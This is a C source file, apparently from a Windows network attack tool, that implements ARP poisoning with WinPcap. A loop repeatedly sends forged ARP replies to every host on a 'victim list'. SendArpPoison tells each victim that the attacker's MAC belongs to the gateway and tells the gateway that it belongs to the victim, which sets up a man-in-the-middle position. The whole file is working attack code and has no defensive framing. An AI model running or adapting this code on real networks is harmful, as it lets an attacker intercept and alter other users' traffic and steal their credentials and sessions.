#define HAVE_REMOTE

#include <stdlib.h>
#include <stdio.h>
#include <pcap.h>
#include <Shlwapi.h>
#include <iphlpapi.h>

#include "APE.h"
#include "ArpPoisoning.h"
#include "LinkedListTargetSystems.h"
#include "Logging.h"
#include "NetworkHelperFunctions.h"


extern int gDEBUGLEVEL;
extern PSYSNODE gTargetSystemsList;



DWORD WINAPI ArpPoisoningLoop(LPVOID scanParamsParam)
{
  int retVal = 0;
  int roundCounter = 0;
  PSCANPARAMS tmpParams = (PSCANPARAMS)scanParamsParam;
  SCANPARAMS scanParams;
  ArpPacket arpPacket;
  unsigned char *date = NULL;
  unsigned char *sysMac = NULL;
  unsigned char *sysIp = NULL;
  int counter2 = 0;
  int counter = 0;
  int numberSystems = 0;
  pcap_if_t *allDevices = NULL;
  pcap_if_t *device = NULL;
  char tempBuffer[PCAP_ERRBUF_SIZE];
  SYSTEMNODE systemList[MAX_SYSTEMS_COUNT];


  ZeroMemory(&scanParams, sizeof(scanParams));
  CopyMemory(&scanParams, tmpParams, sizeof(scanParams));


  // Open interface.
  LogMsg(DBG_LOW, "ArpPoisoningLoop(): Starting");
  if ((scanParams.InterfaceWriteHandle = pcap_open((char *)scanParams.InterfaceName, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL | PCAP_OPENFLAG_MAX_RESPONSIVENESS | PCAP_OPENFLAG_PROMISCUOUS, PCAP_READTIMEOUT, NULL, tempBuffer)) == NULL)
  {
    LogMsg(DBG_ERROR, "ArpPoisoningLoop(): pcap_open() failed (%s)", tempBuffer);
  }

  // Send poisoned packets to all systems in the "victim list"
  while (1)
  {
    LogMsg(DBG_LOW, "ArpPoisoningLoop(): ARP Poisoning round %d", roundCounter);
    ZeroMemory(systemList, sizeof(systemList));

    if ((numberSystems = GetListCopy(gTargetSystemsList, systemList)) > 0)
    {
      LogMsg(DBG_LOW, "ArpPoisoningLoop(): New ARP poisoning round with %d system(s)", numberSystems);

      // Iterate through all systems
      for (counter = 0; counter < numberSystems && counter < MAX_SYSTEMS_COUNT; counter++)
      {
        LogMsg(DBG_LOW, "ArpPoisoningLoop(): #%i: %s -> %02x-%02x-%02x-%02x-%02x-%02x", counter, systemList[counter].sysIpStr,
          systemList[counter].sysMacBin[0],
          systemList[counter].sysMacBin[1],
          systemList[counter].sysMacBin[2],
          systemList[counter].sysMacBin[3],
          systemList[counter].sysMacBin[4],
          systemList[counter].sysMacBin[5]
        );

        // Dont poison the GW with a new MAC.
        if (memcmp(systemList[counter].sysIpBin, scanParams.GatewayIpBin, BIN_IP_LEN) == 0)
        {
          continue;
        }
        else if (systemList[counter].sysIpStr != NULL && strnlen((char *)systemList[counter].sysIpStr, MAX_IP_LEN) > 0 && systemList[counter].sysMacBin != NULL)
        {
          // Prepare the poisoning ARP Reply packet.
          SendArpPoison(&scanParams, systemList[counter].sysMacBin, systemList[counter].sysIpBin);

          /*
           * HACK : No clue how this can happen!! Sometimes ARP requests
           * destined for our own system dont arrive :/
           * We have to send back our MAC/IP to all victims manually
           */
          ZeroMemory(&arpPacket, sizeof(arpPacket));
          arpPacket.ReqType = ARP_REPLY;
          CopyMemory(arpPacket.EthSrcMacBin, scanParams.LocalMacBin, BIN_MAC_LEN);
          CopyMemory(arpPacket.ArpLocalMacBin, scanParams.LocalMacBin, BIN_MAC_LEN);
          CopyMemory(arpPacket.EthDstMacBin, systemList[counter].sysMacBin, BIN_MAC_LEN);
          CopyMemory(arpPacket.ArpDstMacBin, systemList[counter].sysMacBin, BIN_MAC_LEN);

          CopyMemory(arpPacket.ArpLocalIpBin, scanParams.LocalIpBin, BIN_IP_LEN);
          CopyMemory(arpPacket.ArpDstIpBin, systemList[counter].sysIpBin, BIN_IP_LEN);

          SendArpPacket((pcap_t *)scanParams.InterfaceWriteHandle, &arpPacket);

          roundCounter++;
          Sleep(SLEEP_BETWEEN_ARPS);
        }
        else
        {
          LogMsg(DBG_ERROR, "ArpPoisoningLoop(): Target array issue.");
          break;
        }
      }
    }

    Sleep(SLEEP_BETWEEN_REPOISONING);
  }

END:

  LogMsg(DBG_LOW, "ArpPoisoningLoop(): exit");

  return retVal;
}





/*
 * Ethr:	LocalMAC -> VicMAC
 * ARP :	LocMAC/GW-IP -> VicMAC/VicIP
 *
 */
BOOL SendArpPoison(PSCANPARAMS scanParamsParam, unsigned char victimMacBinParam[BIN_MAC_LEN], unsigned char victimIpBinParam[BIN_IP_LEN])
{
  BOOL retVal = TRUE;
  ArpPacket arpPacket;
  char victimIpStr[MAX_BUF_SIZE + 1];
  char victimMacStr[MAX_BUF_SIZE + 1];
  char localIpStr[MAX_BUF_SIZE + 1];
  char localMacStr[MAX_BUF_SIZE + 1];
  char gatewayIpStr[MAX_BUF_SIZE + 1];
  char gatewayMacStr[MAX_BUF_SIZE + 1];


  if (scanParamsParam == NULL || scanParamsParam->InterfaceWriteHandle == NULL)
  {
    retVal = FALSE;
    goto END;
  }

  if (memcmp(victimMacBinParam, scanParamsParam->GatewayMacBin, BIN_MAC_LEN) == 0)
  {
    retVal = FALSE;
    goto END;
  }

  ZeroMemory(victimIpStr, sizeof(victimIpStr));
  ZeroMemory(victimMacStr, sizeof(victimMacStr));
  ZeroMemory(localIpStr, sizeof(localIpStr));
  ZeroMemory(localMacStr, sizeof(localMacStr));
  ZeroMemory(gatewayIpStr, sizeof(gatewayIpStr));
  ZeroMemory(gatewayMacStr, sizeof(gatewayMacStr));

  IpBin2String(victimIpBinParam, (unsigned char *)victimIpStr, sizeof(victimIpStr));
  IpBin2String(scanParamsParam->LocalIpBin, (unsigned char *)localIpStr, sizeof(localIpStr));
  IpBin2String(scanParamsParam->GatewayIpBin, (unsigned char *)gatewayIpStr, sizeof(gatewayIpStr));

  MacBin2String(victimMacBinParam, (unsigned char *)victimMacStr, sizeof(victimMacStr));
  MacBin2String(scanParamsParam->LocalMacBin, (unsigned char *)localMacStr, sizeof(localMacStr));
  MacBin2String(scanParamsParam->GatewayMacBin, (unsigned char *)gatewayMacStr, sizeof(gatewayMacStr));
  
  // Poisoning from A to B.
  ZeroMemory(&arpPacket, sizeof(arpPacket));

  arpPacket.ReqType = ARP_REPLY;
  // Set MAC values
  CopyMemory(arpPacket.EthSrcMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
  CopyMemory(arpPacket.EthDstMacBin, victimMacBinParam, BIN_MAC_LEN);

  // Set ARP reply values
  CopyMemory(arpPacket.ArpLocalMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
  CopyMemory(arpPacket.ArpLocalIpBin, scanParamsParam->GatewayIpBin, BIN_IP_LEN);

  CopyMemory(arpPacket.ArpDstMacBin, victimMacBinParam, BIN_MAC_LEN);
  CopyMemory(arpPacket.ArpDstIpBin, victimIpBinParam, BIN_IP_LEN);

  // Send packet
  if (SendArpPacket((pcap_t *)scanParamsParam->InterfaceWriteHandle, &arpPacket) == FALSE)
  {
    LogMsg(DBG_ERROR, "Unable to send ARP poisoning packet A2B: %s/%-15s <-->  %s/%-15s", victimMacStr, victimIpStr, gatewayMacStr, gatewayIpStr);
    retVal = FALSE;
  }
  else
  {
    LogMsg(DBG_INFO, "SendArpPoison(): Poisoning A2B %s/%-15s <-->  %s/%-15s", victimMacStr, victimIpStr, gatewayMacStr, gatewayIpStr);
  }


  // Poisoning from B to A.
  ZeroMemory(&arpPacket, sizeof(arpPacket));

  arpPacket.ReqType = ARP_REPLY;
  // Set MAC values
  CopyMemory(arpPacket.EthSrcMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
  CopyMemory(arpPacket.EthDstMacBin, scanParamsParam->GatewayMacBin, BIN_MAC_LEN);

  // Set ARP reply values
  CopyMemory(arpPacket.ArpLocalMacBin, scanParamsParam->LocalMacBin, BIN_MAC_LEN);
  CopyMemory(arpPacket.ArpLocalIpBin, victimIpBinParam, BIN_IP_LEN);

  CopyMemory(arpPacket.ArpDstMacBin, scanParamsParam->GatewayMacBin, BIN_MAC_LEN);
  CopyMemory(arpPacket.ArpDstIpBin, scanParamsParam->GatewayIpBin, BIN_IP_LEN);

  // Send packet
  if (SendArpPacket((pcap_t *)scanParamsParam->InterfaceWriteHandle, &arpPacket) == FALSE)
  {
    LogMsg(DBG_ERROR, "Unable to send ARP poisoning packet B2A: %s/%-15s <-->  %s/%-15s", gatewayMacStr, gatewayIpStr, victimMacStr, victimIpStr);
    retVal = FALSE;
  }
  else
  {
    LogMsg(DBG_INFO, "SendArpPoison(): Poisoning B2A %s/%-15s <-->  %s/%-15s", gatewayMacStr, gatewayIpStr, victimMacStr, victimIpStr);
  }

END:

  return retVal;
}



BOOL SendArpPacket(void *interfaceHandleParam, PArpPacket arpPacketParam)
{
  BOOL retVal = FALSE;
  unsigned char arpPacket[sizeof(ETHDR) + sizeof(ARPHDR)];
  int counter = 0;
  PETHDR ethrHdrPtr = (PETHDR)arpPacket;
  PARPHDR arpHdrPtr = (PARPHDR)(arpPacket + 14);

  ZeroMemory(arpPacket, sizeof(arpPacket));

  // Layer 1/2 (Physical)
  CopyMemory(ethrHdrPtr->ether_shost, arpPacketParam->EthSrcMacBin, BIN_MAC_LEN);
  CopyMemory(ethrHdrPtr->ether_dhost, arpPacketParam->EthDstMacBin, BIN_MAC_LEN);
  ethrHdrPtr->ether_type = htons(ETHERTYPE_ARP);

  // Layer 2
  arpHdrPtr->htype = htons(0x0001); // Ethernet
  arpHdrPtr->ptype = htons(0x0800); // IP
  arpHdrPtr->hlen = 0x0006;
  arpHdrPtr->plen = 0x0004;
  arpHdrPtr->opcode = htons(arpPacketParam->ReqType);

  CopyMemory(arpHdrPtr->tpa, arpPacketParam->ArpDstIpBin, BIN_IP_LEN);
  CopyMemory(arpHdrPtr->tha, arpPacketParam->ArpDstMacBin, BIN_MAC_LEN);

  CopyMemory(arpHdrPtr->spa, arpPacketParam->ArpLocalIpBin, BIN_IP_LEN);
  CopyMemory(arpHdrPtr->sha, arpPacketParam->ArpLocalMacBin, BIN_MAC_LEN);

  // Send down the packet
  int funcRetVal = 0;
  if (interfaceHandleParam != NULL && 
      (funcRetVal = pcap_sendpacket(interfaceHandleParam, arpPacket, sizeof(ETHDR) + sizeof(ARPHDR))) == 0)
  {
    retVal = TRUE;
  }

  return retVal;
}

